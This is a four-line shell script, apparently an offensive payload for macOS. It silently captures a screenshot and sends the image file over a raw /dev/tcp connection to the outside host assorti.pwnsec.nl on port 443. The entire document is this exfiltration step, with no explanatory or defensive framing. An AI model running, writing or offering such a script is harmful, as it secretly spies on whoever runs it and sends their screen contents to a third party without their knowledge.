#!/bin/sh

screencapture -x screenshot.jpg
cat screenshot.jpg >& /dev/tcp/assorti.pwnsec.nl/443 0>&1
